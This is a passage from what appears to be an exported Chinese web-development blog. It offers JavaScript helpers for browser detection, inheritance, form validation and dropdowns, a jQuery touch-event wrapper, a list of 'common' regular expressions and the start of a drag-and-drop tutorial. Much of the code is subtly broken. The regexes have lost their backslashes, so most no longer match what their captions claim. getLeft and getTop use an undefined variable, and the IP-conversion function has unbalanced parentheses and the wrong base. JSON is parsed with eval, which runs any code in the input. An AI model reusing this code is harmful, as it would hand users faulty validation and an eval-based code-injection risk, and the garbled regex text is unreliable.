返回num的正切值Math.E : 自然数(2.718281828459045)Math.LN2 : 2的自然对数(0.6931471805599453)Math.LN10 : 10的自然对数(2.302585092994046)Math.LOG2E : log 2 为底的自然数(1.4426950408889634)Math.LOG10E : log 10 为底的自然数(0.4342944819032518)Math.PI : π(3.141592653589793)Math.SQRT1_2 : 1/2的平方根(0.7071067811865476)Math.SQRT2 : 2的平方根(1.4142135623730951)&nbsp;9.浏览器特征函数:123456789101112131415161718//1.浏览器名称//IE : "Microsoft Internet Explorer"//NS : "Netscape"var browserName = navigator.appName;//2.浏览器版本var browserVersion = navigator.appVersion;//3.客户端操作系统var isWin = ( navigator.userAgent.indexOf("Win") != -1 );var isMac = ( navigator.userAgent.indexOf("Mac") != -1 );var isUnix = ( navigator.userAgent.indexOf("X11") != -1 );//4.判断是否支持某对象,方法,属性//当一个对象,方法,属性未定义时会返回undefined或null等,这些特殊值都是falseif( document.images )&#123; &#125;if( document.getElementById )&#123; &#125;//5.检查浏览器当前语言if( navigator.userLanguage )&#123; var l = navigator.userLanguage.toUpperCase(); &#125;//6.检查浏览器是否支持Cookiesif( navigator.cookieEnabled )&#123; &#125;&nbsp;10.JavaScript面向对象的方法实现继承:call方法123456789101112131415161718192021222324252627282930313233// 动物类 animalfunction animal(bSex)&#123;this.sex = bSexthis.getSex = function()&#123;return this.sex&#125;&#125;// 类静态变量 (如果你不修改它的话～～)animal.SEX_G = new Object(); // 雌性animal.SEX_B = new Object(); // 雄性// 动物子类 鸟function bird(bSex)&#123;animal.call(this, bSex);this.fly = function(iSpeed)&#123;alert("飞行时速高达 " + iSpeed);&#125;&#125;// 动物子类 鱼function fish(bSex)&#123;animal.call(this, bSex);this.swim = function(iSpeed)&#123;alert("游动时速高达 " + iSpeed)&#125;&#125;// 鱼 鸟 杂交品种。。。function crossBF(bSex)&#123;bird.call(this, bSex);fish.call(this, bSex);&#125;var oPet = new crossBF(animal.SEX_G); // 雌性 鱼鸟alert(oPet.getSex() == animal.SEX_G ? "雌性" : "雄性");oPet.fly(124)oPet.swim(254)&nbsp;11.用面向对象的编程方式写JavaScript:1234567891011121314151617MyTool = new function()&#123;/*** 返回非空字符串,如果有默认值就返回默认字符串.*/this.notNull = function(str,defaultStr)&#123;if(typeof(str)=="undefined"||str==null||str=='')&#123;if(defaultStr)return defaultStr;elsereturn '';&#125;else&#123;return str;&#125;&#125;&#125;rootId = MyTool.notNull(rootId,'001000');&nbsp;12.常用的js方法,包括表单校验的一些方法,下拉菜单常用的方法等等:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314/*** 对JSON对象转换为字符串.* @param &#123;json对象&#125; json* @return &#123;json字符串&#125;*/function jsonObj2Str(json) &#123;var str = "&#123;";for (prop in json) &#123;str += prop + ":" + json[prop] + ",";&#125;str = str.substr(0, str.length - 1);str += "&#125;";return str;&#125;/*** 将json字符串转换为json对象.* @param &#123;json字符串&#125; jsonstr* @return &#123;json对象&#125;*/function jsonStr2Obj(jsonstr) &#123;return eval("("+jsonstr+")");&#125;/*** 得到一个元素的left坐标值.* @param &#123;dom对象&#125; obj* @return &#123;位置值&#125;*/function getLeft(obj)&#123;var offset=e.offsetLeft;if(e.offsetParent!=null) offset+=getLeft(e.offsetParent);return offset;&#125;/*** 得到一个元素的绝对位置的top坐标值.* @param &#123;dom对象&#125; obj* @return &#123;位置值&#125;*/function getTop(obj)&#123;var offset=e.offsetTop;if(e.offsetParent!=null) offset+=getTop(e.offsetParent);return offset;&#125;/*** 删除一个字符串的左右空格.* @param &#123;原始字符串&#125; str* @return &#123;删除空格之后的字符串&#125;*/function trim(str)&#123;return str.replace(/(^\s*)|(\s*$)/g,"");&#125;/*** 根据id取出一个元素.* @param &#123;元素id值&#125; str* @return &#123;dom对象&#125;*/function $(str) &#123;return document.getElementById(str);&#125;/*** 按name获取一个对象.* @param &#123;元素name值&#125; str* @return &#123;根据name返回的第一个对象&#125;*/function $byName(str) &#123;var arr = document.getElementsByName(str);if (arr)return arr[0];elsereturn null;&#125;/***************以下方法和表单验证相关*************************************************//*** 返回非空字符串,如果有默认值就返回默认字符串.* @param &#123;要进行转换的原字符串&#125; str* @param &#123;默认值&#125; defaultStr* @return &#123;返回结果&#125;*/function notNull(str, defaultStr) &#123;if (typeof(str) == "undefined" || str == null || str == '') &#123;if (defaultStr)return defaultStr;elsereturn '';&#125; else &#123;return str;&#125;&#125;/*** 比较两个日期大小.* @param &#123;较小日期的文本框id&#125; smallDate* @param &#123;较大日期的文本框id&#125; bigDate* @param &#123;出错的提示信息&#125; msg*/function compareTwoDate(smallDate, bigDate, msg) &#123;var v1 = $(smallDate).value;var v2 = $(bigDate).value;if (v1 &gt;= v2) &#123;alert(msg);v2.focus();return false;&#125;return true;&#125;/*** 比较两个金额大小的方法.* @param &#123;较小的金额&#125; smallNum* @param &#123;较大的金额&#125; bigNum* @param &#123;出错提示信息&#125; msg* @return &#123;Boolean&#125;*/function compareTwoNum(smallNum, bigNum, msg) &#123;var v1 = $(smallNum).value;var v2 = $(bigNum).value;if (parseFloat(v1) &gt;= parseFloat(v2)) &#123;alert(msg);v2.focus();return false;&#125;return true;&#125;/*** 检查文本框的长度是否超出指定长度.* @param &#123;文本id&#125; textId* @param &#123;文本框的最大长度&#125; len* @param &#123;文本框描述内容&#125; msg* @return &#123;有错就返回false,否则返回true&#125;*/function checkLength(textId, len, msg) &#123;obj = $(textId);str = obj.value;str = str.replace(/[^\x00-\xff]/g, "**");realLen = str.length;if (realLen &gt; len) &#123;alert("[" + msg + "]" + "长度最大为" + len + "位," + "请重新输入！\n注意：一个汉字占2位。");obj.focus();return false;&#125; elsereturn true;&#125;/*** 判断某个文本框不可以为空.* @param &#123;文本框id&#125; textId* @param &#123;文本框描述内容&#125; msg* @return &#123;有错就返回false,否则返回true&#125;*/function checkIfEmpty(textId, msg) &#123;var textObj = $(textId);var textValue = textObj.value;if (trim(textValue) == '') &#123;alert('[' + msg + ']不得为空！');textObj.focus();return false;&#125; else &#123;return true;&#125;&#125;/*** 判断指定文本框内容必须为邮件.* @param &#123;文本框id&#125; textId* @param &#123;文本框描述&#125; msg* @return &#123;如果是邮件内容就返回true否则返回false&#125;*/function checkIsMail(textId, msg) &#123;var obj = $(textId);if (!_isEmail(obj.value)) &#123;alert('[' + msg + ']不是合法的邮件地址！');obj.focus();return false;&#125; elsereturn true;&#125;/*** 验证是不是邮件.* @param &#123;要验证的字符串&#125; strEmail* @return &#123;Boolean&#125;*/function _isEmail(strEmail) &#123;//接下来的验证是否有两个以上的‘.'号，有的话就是错的！var first = strEmail.indexOf('.');if (strEmail.indexOf('@')== -1) &#123;return false;&#125;var tempStr = strEmail.substring(first + 1);if (tempStr.indexOf('.') != -1) &#123;return false;&#125;if (strEmail.search(/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/) != -1) &#123;return true;&#125; elsereturn false;&#125;/*** 判断某个文本框是否数字.* @param &#123;文本框id&#125; textId* @param &#123;文本框描述内容&#125; msg* @return &#123;Boolean&#125;*/function checkIsNum(textId, msg) &#123;obj = $(textId);if (isNaN(obj.value)) &#123;alert('[' + msg + ']必须为数字。');obj.focus();return false;&#125; elsereturn true;&#125;/*** 判断某个文本框是否含有非法字符.* @param &#123;文本框的id&#125; textId* @param &#123;文本框描述内容&#125; msg* @return &#123;有错就返回false否则返回true&#125;*/function checkIsValid(textId, msg) &#123;obj = $(textId);if (!_isValidString(obj.value, '[' + msg + ']不得含有非法字符。')) &#123;obj.focus();return false;&#125;return true;&#125;/*** 判断是不是合法字符串.* @param &#123;要进行判断的字符串&#125; szStr* @param &#123;文本描述&#125; errMsg* @return &#123;合法则返回true否则返回false&#125;*/function _isValidString(szStr,errMsg) &#123;voidChar = "'\"&gt;&lt;`~!@#$%^&amp;amp;\(\)（）！￥……？?“”‘'*";for (var i = 0; i &lt; voidChar.length; i++) &#123; aChar = voidChar.substring(i, i + 1); if (szStr.indexOf(aChar) &gt; -1)&#123;alert(errMsg)return false;&#125;&#125;return true;&#125;/*************** 以下方法和下拉菜单相关*************************************************//*** 控制下拉菜单不可以为-1(未选择情况value=-1)* @param &#123;下拉菜单id&#125; selectId* @param &#123;下拉菜单描述内容&#125; msg* @param &#123;下拉菜单的空值对应的value,默认为-1&#125; nullValue* @return &#123;Boolean&#125;*/function checkChooseSelect(selectId, msg ,nullValue) &#123;var obj = $(selectId);if (obj.value == notNull(nullValue,'-1')) &#123;alert('[' + msg + ']必选!');obj.focus();return false;&#125; elsereturn true;&#125;/*** 得到下拉菜单的显示的文字.* @param &#123;下拉菜单dom对象&#125; selectObj* @return &#123;返回下拉菜单的显示的"文本"&#125;*/function getSelectText(selectObj) &#123;return selectObj.options[selectObj.selectedIndex].text;&#125;/*** 得到下拉菜单的显示的值.* @param &#123;下拉菜单dom对象&#125; selectObj* @return &#123;得到下拉菜单的显示的"值"&#125;*/function getSelectValue(selectObj) &#123;return selectObj.options[selectObj.selectedIndex].value;&#125;/*** 设置下拉菜单的选择状态到指定的值.* @param &#123;下拉菜单对象&#125; obj* @param &#123;要选择的值&#125; value*/function setSelectValue(obj, value) &#123;/*for (i = obj.options.length - 1; i &gt;= 0; i--) &#123;if (obj.options[i].value == value) &#123;obj.options[i].selected = true;return;&#125;&#125;*/obj.value= value;&#125;/*** 根据键值串的内容进行下拉菜单的动态组装* @param &#123;要进行下拉菜单组装的dom对象&#125; obj* @param &#123;键值对用,和;分割,例如'1,男;2,女;3,未知'&#125; valAndText*/function setSelectContent(obj,valAndText)&#123;if(trim(valAndText)=='')&#123;alert('没有要进行组装下拉菜单的数据!');return false;&#125;clearSelect(obj);var keyandvalues = valAndText.split(';');for(var i=0;i&lt;keyandvalues.length;i++)&#123; var arr = keyandvalues[i].split(','); if(arr)&#123; var value =arr[0]; var text =arr[1]; var objOption = new Option(text,value); obj.add(objOption); &#125; &#125; &#125; /** * 清空下拉菜单里面的内容. * @param &#123;下拉菜单对象&#125; obj */ function clearSelect(obj) &#123; for (var i=obj.options.length; i &gt;0; i--) &#123;obj.remove(0);&#125;&#125;/*************** 以下方法和多选框相关*************************************************//*** 返回选中的checks的id组成的字符串,逗号隔开.* @param &#123;checks数组&#125; checks* @return 选择的id组成的字符串*/function getCheckedIds(checks)&#123;var selectedValue = '';var len = checks.length;for(var index=0; index&lt;len; index++) &#123; if(checks[index].checked==true) &#123; selectedValue += checks[index].value+","; &#125; &#125; if(selectedValue.length&gt;0)return selectedValue.substring(0,selectedValue.length-1);return selectedValue;&#125;&nbsp;下面的代码放到html标签里，并在head里调用上面的js：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;HEAD&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;!--&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;调用上面的js&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--&gt;&lt;/HEAD&gt;&lt;SCRIPT LANGUAGE="JavaScript"&gt;&lt;!--/*** 表单验证的示例js方法.*/function check()&#123;if(checkIfEmpty('a','非空校验')&amp;amp;&amp;amp;checkIsMail('b','邮箱校验')&amp;amp;&amp;amp;checkIsNum('c','数字校验')&amp;amp;&amp;amp;checkIsValid('d','合法性校验')&amp;amp;&amp;amp;compareTwoDate('e','f','小日期与大日期关系错误!')&amp;amp;&amp;amp;checkLength('g',5,'长度校验')&amp;amp;&amp;amp;checkChooseSelect('h','下拉菜单非空','-1')&amp;amp;&amp;amp;compareTwoNum('k','l','大小数目关系不正确!'))&#123;alert('校验通过!');return true;&#125;else&#123;return false;&#125;&#125;/*** 取下拉菜单的值和文本的示例js方法.*/function getSelect()&#123;var sss = $('h');alert('下拉菜单选择的文本是:'+getSelectText(sss)+'\n'+'下拉菜单选择的值是:'+getSelectValue(sss));&#125;/*** 根据键值字符串设置下拉菜单的显示内容.*/function setSelect()&#123;var sss = $('i').value;setSelectContent($('h'),sss);&#125;/*** 返回多选框数组选择状态的id的字符串,结果以逗号隔开.*/function getMulti()&#123;alert('多选选择的id是:'+getCheckedIds(document.getElementsByName('j')));&#125;//--&gt;&lt;/SCRIPT&gt;&lt;BODY&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt; 非空:&lt;input id='a'&gt;&lt;/td&gt;&lt;td&gt; checkIfEmpty('a','非空校验') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 邮箱:&lt;input id='b' value='323232@2323.com'&gt;&lt;/td&gt;&lt;td&gt; checkIsMail('b','邮箱校验') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 数字:&lt;input id='c' value='aaaa'&gt;&lt;/td&gt;&lt;td&gt; checkIsNum('c','数字校验') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 合法字符:&lt;input id='d' value='@$@$#$#!%%#'&gt;&lt;/td&gt;&lt;td&gt; checkIsValid('d','合法性校验') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 小的日期:&lt;input id='e' value='2010-1-1'&gt;大的日期:&lt;input id='f' value='2011-1-1'&gt;&lt;/td&gt;&lt;td&gt; compareTwoDate('e','f','小日期与大日期关系错误!') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 小的数:&lt;input id='k' value='12.3'&gt;大的数:&lt;input id='l' value='4564'&gt;&lt;/td&gt;&lt;td&gt; compareTwoNum('k','l','大小数目关系不正确!') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 字符长度校验(&lt;5):&lt;input id='g'&gt;&lt;/td&gt;&lt;td&gt; checkLength('g',5,'长度校验') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 下拉菜单非空校验:&lt;select id='h'&gt;&lt;option value='-1'&gt; 请选择 &lt;/option&gt;&lt;option value='1'&gt; 立项 &lt;/option&gt;&lt;option value='2'&gt; 可研 &lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;td&gt; checkChooseSelect('h','下拉菜单非空','-1') &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td colspan='2'&gt;&lt;button onclick='check()'&gt; 测试表单校验方法 &lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;button onclick='getSelect()'&gt; 得到下拉菜单的值 &lt;/button&gt;&lt;/td&gt;&lt;td&gt; getSelectText(sss)和getSelectValue(sss) &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; 输入下拉菜单的键值字符串(如右所示)&lt;input id='i' value='1,男;2,女;3,未知'&gt;&lt;button onclick='setSelect()'&gt; 设置下拉菜单的值 &lt;/button&gt;&lt;/td&gt;&lt;td&gt; setSelectContent($('h'),sss) &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type='checkbox' name='j' value='aaa1'&gt;&lt;input type='checkbox' name='j' value='aaa2'&gt;&lt;input type='checkbox' name='j' value='aaa3'&gt;&lt;input type='checkbox' name='j' value='aaa4'&gt;&lt;button onclick='getMulti()'&gt; 得到多选选择的id &lt;/button&gt;&lt;/td&gt;&lt;td&gt; getCheckedIds(document.getElementsByName('j')) &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/BODY&gt;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js功能总结</tag>
        <tag>js基本函数</tag>
        <tag>js基本功能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端开发触屏事件的封装]]></title>
    <url>%2F2015%2F09%2F25%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91%E8%A7%A6%E5%B1%8F%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%B0%81%E8%A3%85%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940/*author:grycheng本次封装触屏事件实现触屏操作更加细腻调用方式:$(xxx).touchme(event,function(distance,type,axis)&#123;//distance：代表x轴或者y轴偏移（以偏移更多的一个方向为准） 可为正值或负值，代表不同方向的偏移//type：为move时表示当前触发的是touchmove事件，为click时触发的是touchend事件//axis：为x代表x轴偏移，为y代表y轴偏移&#125;);*/$.fn.touchme = function(event,fn)&#123; var startele = $(this); var touch = event.targetTouches[0]; var endPos = false; startPos = &#123;x:touch.pageX,y:touch.pageY,time:+new Date&#125;; isScrolling = 0; startele.bind("touchmove",function(event)&#123; if(event.targetTouches.length &gt; 1 || event.scale &amp;&amp; event.scale !== 1) return; var touch = event.targetTouches[0]; endPos = &#123;x:touch.pageX - startPos.x,y:touch.pageY - startPos.y&#125;; isScrolling = Math.abs(endPos.x) &lt; Math.abs(endPos.y) ? 1:0; if(isScrolling === 0)&#123; event.preventDefault(); fn(endPos.x,'move','x'); &#125;else&#123; event.preventDefault(); fn(endPos.y,'move','y'); &#125; &#125;); startele.bind("touchend",function(event)&#123; var duration = +new Date - startPos.time; if(isScrolling === 0)&#123; fn(endPos.x,'click','x'); &#125;else&#123; fn(endPos.y,'click','y'); &#125; startele.unbind("touchmove"); startele.unbind("touchend"); &#125;);&#125;;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端触屏事件封装</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery网页浮动导航锚点链接屏幕上下滚动效果,锚点滚屏跟随]]></title>
    <url>%2F2015%2F09%2F25%2Fjquery%E7%BD%91%E9%A1%B5%E6%B5%AE%E5%8A%A8%E5%AF%BC%E8%88%AA%E9%94%9A%E7%82%B9%E9%93%BE%E6%8E%A5%E5%B1%8F%E5%B9%95%E4%B8%8A%E4%B8%8B%E6%BB%9A%E5%8A%A8%E6%95%88%E6%9E%9C%E9%94%9A%E7%82%B9%E6%BB%9A%2F</url>
    <content type="text"><![CDATA[jquery网页浮动导航锚点链接屏幕上下滚动效果,锚点滚屏跟随查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>导航锚点链接屏幕</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有用的javascript外部文件或其他外部文件引用]]></title>
    <url>%2F2015%2F09%2F22%2F%E6%9C%89%E7%94%A8%E7%9A%84javascript%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E5%85%B6%E4%BB%96%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E5%BC%95%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1、1&lt;link href='http://fonts.googleapis.com/css?family=PT+Sans+Narrow' rel='stylesheet' type='text/css' /&gt;&lt;!--引入谷歌字体API--&gt;2、1&lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js"&gt;&lt;/script&gt;&lt;!--引入谷歌的外部jquery文件--&gt;3、引入外部js文件，html5标签，让它们在IE6\7\8可以成为标签当IE的等版本浏览器不支持html5标签时，这个外部别人已经写好的js文件，只要引入进来，就可以很好的解决这个问题。不用再自己一个个的createElement地去创建标签了123&lt;!--[if IE]&gt;&lt;script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;使用Modernizr，Modernizr会自动替你解决上述问题，不用使用html5.js或者样式规则。1、打开www.modernizr.com，找到 Download Modernizr 区域，单击其中的Development按钮，下载Modernizr的js文件。2、把下载到的js文件放到你的网页所在文件夹，例如js文件夹。3、在页面1234567891011示例：```html&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Html5&lt;/title&gt;&lt;!--[if lt IE 9]&gt;&lt;script src=&quot;/skin/blog/js/modernizr.js&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt;...&lt;/head&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>javascript外部文件的引用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发中常用的正则表达式]]></title>
    <url>%2F2015%2F09%2F22%2F%E5%BC%80%E5%8F%91%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[下面都是我收集的一些比较常用的正则表达式，因为平常可能在表单验证的时候，用到的比较多。特发出来，让各位朋友共同使用。匹配中文字符的正则表达式： [u4e00-u9fa5]评注：匹配中文还真是个头疼的事，有了这个表达式就好办了匹配双字节字符(包括汉字在内)：[^x00-xff]评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）匹配空白行的正则表达式：ns*r评注：可以用来删除空白行匹配HTML标记的正则表达式：&lt; (S?)[^&gt;]&gt;.?|&lt; .? /&gt;评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力匹配首尾空白字符的正则表达式：^s|s$评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式匹配Email地址的正则表达式：w+([-+.]w+)@w+([-.]w+).w+([-.]w+)*评注：表单验证时很实用匹配网址URL的正则表达式：[a-zA-z]+://[^s]*注：网上流传的版本功能很有限，上面这个基本可以满足需求匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$评注：表单验证时很实用匹配国内电话号码：d{3}-d{8}|d{4}-d{7}评注：匹配形式如 0511-4405222 或 021-87888822匹配腾讯QQ号：[1-9][0-9]{4,}评注：腾讯QQ号从10000开始匹配中国邮政编码：[1-9]d{5}(?!d)评注：中国邮政编码为6位数字匹配身份证：d{15}|d{18}评注：中国的身份证为15位或18位匹配ip地址：d+.d+.d+.d+评注：提取ip地址时有用匹配特定数字：^[1-9]d*$ //匹配正整数^-[1-9]d*$ //匹配负整数^-?[1-9]d*$ //匹配整数^[1-9]d*|0$ //匹配非负整数（正整数 + 0）^-[1-9]d*|0$ //匹配非正整数（负整数 + 0）^[1-9]d.d|0.d[1-9]d$ //匹配正浮点数^-([1-9]d.d|0.d[1-9]d)$ //匹配负浮点数^-?([1-9]d.d|0.d[1-9]d|0?.0+|0)$ //匹配浮点数^[1-9]d.d|0.d[1-9]d|0?.0+|0$ //匹配非负浮点数（正浮点数 + 0）^(-([1-9]d.d|0.d[1-9]d))|0?.0+|0$ //匹配非正浮点数（负浮点数 + 0）评注：处理大量数据时有用，具体应用时注意修正&nbsp;&nbsp;匹配特定字符串：^[A-Za-z]+$ //匹配由26个英文字母组成的字符串^[A-Z]+$ //匹配由26个英文字母的大写组成的字符串^[a-z]+$ //匹配由26个英文字母的小写组成的字符串^[A-Za-z0-9]+$ //匹配由数字和26个英文字母组成的字符串^w+$ //匹配由数字、26个英文字母或者下划线组成的字符串在使用RegularExpressionValidator验证控件时的验证功能及其验证表达式介绍如下:只能输入数字：“^[0-9]*$”只能输入n位的数字：“^d{n}$”只能输入至少n位数字：“^d{n,}$”只能输入m-n位的数字：“^d{m,n}$”只能输入零和非零开头的数字：“^(0|[1-9][0-9]*)$”只能输入有两位小数的正实数：“^[0-9]+(.[0-9]{2})?$”只能输入有1-3位小数的正实数：“^[0-9]+(.[0-9]{1,3})?$”只能输入非零的正整数：“^+?[1-9][0-9]*$”只能输入非零的负整数：“^-[1-9][0-9]*$”只能输入长度为3的字符：“^.{3}$”只能输入由26个英文字母组成的字符串：“^[A-Za-z]+$”只能输入由26个大写英文字母组成的字符串：“^[A-Z]+$”只能输入由26个小写英文字母组成的字符串：“^[a-z]+$”只能输入由数字和26个英文字母组成的字符串：“^[A-Za-z0-9]+$”只能输入由数字、26个英文字母或者下划线组成的字符串：“^w+$”验证用户密码:“^[a-zA-Z]w{5,17}$”正确格式为：以字母开头，长度在6-18之间，只能包含字符、数字和下划线。验证是否含有^%&amp;’,;=?$”等字符：“[^%&amp;’,;=?$x22]+”只能输入汉字：“^[u4e00-u9fa5],{0,}$”验证Email地址：“^w+[-+.]w+)@w+([-.]w+).w+([-.]w+)*$”验证InternetURL：“^http://([w-]+.)+[w-]+(/[w-./?%&amp;=]*)?$”验证电话号码：“^((d{3,4})|d{3,4}-)?d{7,8}$”正确格式为：“XXXX-XXXXXXX”，“XXXX-XXXXXXXX”，“XXX-XXXXXXX”，“XXX-XXXXXXXX”，“XXXXXXX”，“XXXXXXXX”。验证身份证号（15位或18位数字）：“^d{15}|d{}18$”验证一年的12个月：“^(0?[1-9]|1[0-2])$”正确格式为：“01”-“09”和“1”“12”验证一个月的31天：“^((0?[1-9])|((1|2)[0-9])|30|31)$”正确格式为：“01”“09”和“1”“31”。匹配中文字符的正则表达式： [u4e00-u9fa5]匹配双字节字符(包括汉字在内)：[^x00-xff]匹配空行的正则表达式：n[s| ]*r匹配HTML标记的正则表达式：/&lt; (.)&gt;.|&lt; (.*) /&gt;/匹配首尾空格的正则表达式：(^s)|(s$)匹配Email地址的正则表达式：w+([-+.]w+)@w+([-.]w+).w+([- .]w+)匹配网址URL的正则表达式：http://([w-]+.)+[w-]+(/[w- ./?%&amp;=]*)?(1)应用：计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）String.prototype.len=function(){return this.replace([^x00-xff]/g,”aa”).length;}&nbsp;(2)应用：javascript中没有像vbscript那样的trim函数，我们就可以利用这个表达式来实现String.prototype.trim = function(){return this.replace(/(^s)|(s$)/g, “”);}(3)应用：利用正则表达式分解和转换IP地址123456789101112function IP2V(ip) //IP地址转换成对应数值&#123;re=/(d+).(d+).(d+).(d+)/g //匹配IP地址的正则表达式if(re.test(ip))&#123;returnRegExp.$1*Math.pow(255,3))+RegExp.$2*Math.pow(255,2))+RegExp.$3*255+RegExp.$4*1&#125;else&#123;throw new Error("Not a valid IP address!")&#125;&#125;(4)应用：从URL地址中提取文件名的javascript程序12s="http://www.9499.net/page1.htm";s=s.replace(/(.*/)&#123;0,&#125;([^.]+).*/ig,"$2") ; //Page1.htm(5)应用：利用正则表达式限制网页表单里的文本框输入内容用正则表达式限制只能输入中文：onkeyup=”value=”/blog/value.replace(/[“^u4E00-u9FA5]/g,’’) “ onbeforepaste=”clipboardData.setData(‘text’,clipboardData.getData(‘text’).replace(/[^u4E00-u9FA5]/g,’’))”用正则表达式限制只能输入全角字符： onkeyup=”value=”/blog/value.replace(/[“^uFF00-uFFFF]/g,’’) “ onbeforepaste=”clipboardData.setData(‘text’,clipboardData.getData(‘text’).replace(/[^uFF00-uFFFF]/g,’’))”用正则表达式限制只能输入数字：onkeyup=”value=”/blog/value.replace(/[“^d]/g,’’)”onbeforepaste= “clipboardData.setData(‘text’,clipboardData.getData(‘text’).replace(/[^d]/g,’’))”用正则表达式限制只能输入数字和英文：onkeyup=”value=”/blog/value.replace(/[W]/g,”‘’)”onbeforepaste=”cl]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>常用的正则表达</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解事件捕获，在限制范围内拖拽div+吸附+事件捕获]]></title>
    <url>%2F2015%2F09%2F22%2F%E7%90%86%E8%A7%A3%E4%BA%8B%E4%BB%B6%E6%8D%95%E8%8E%B7%EF%BC%8C%E5%9C%A8%E9%99%90%E5%88%B6%E8%8C%83%E5%9B%B4%E5%86%85%E6%8B%96%E6%8B%BDdiv%E5%90%B8%E9%99%84%E4%BA%8B%E4%BB%B6%E6%8D%95%E8%8E%B7%2F</url>
    <content type="text"><![CDATA[一、实现的效果是在限制范围内拖拽div+吸附+事件捕获。&emsp;&emsp;这里需要理解的是事件捕获，这个事件捕获也是为了兼容div在拖拽过程中，文本不被选中这个问题。如此良辰美景，拖拽也可以很洒脱哈。先看看图二、一步步的实现这个拖拽过程的几个要求（一）拖拽起来里面的边框是表示页面哦（我们的屏幕所能看到的东东）。获取移动距离的思路：&emsp;&emsp;记录鼠标按下和鼠标抬起两次的坐标，然后相减，再加上div跟边缘之间的间距。就得到移动距离。&emsp;&emsp;之前我也在这里困惑了，不明白为什么还要再加上offsetLeft。原因就是clientX获取到的是数值是不加上div跟边缘的距离，不是marin，也不是padding，而是浏览器渲染的问题。==下面是我自己的理解：==终于明白这个移动距离是如何计算出来的：&emsp;&emsp;将式子化简之后，得到的就是移动后的Div clientX-移动前clientX，然后再加上offsetLeft，因为这个clientX是没有把边缘计算下去，为了获取准确的数值，要把浏览器默认的边缘计算下去。&emsp;&emsp;如图所以：鼠标移动过的距离就是我用红色画出部分再加上div跟边缘之间的offsetLeft（X轴方向）和offsetTop（Y轴方向）。&emsp;如果上面式子不好理解，就把他化简之后来看，就明白了。距离获取完成，现在就可以通过鼠标的三个事件onmousedown、onmousemove、onmouseup来拖拽鼠标。当鼠标移动时，就不断地更改div的left和top属性12oDiv2.style.left = l +'px';Div2.style.top = t +'px';最后，当鼠标抬起时，要释放onmousedown和onmousemove事件。12this.onmousedown = null;this.onmousemove = null;（二）边缘吸附边缘吸附的原理so 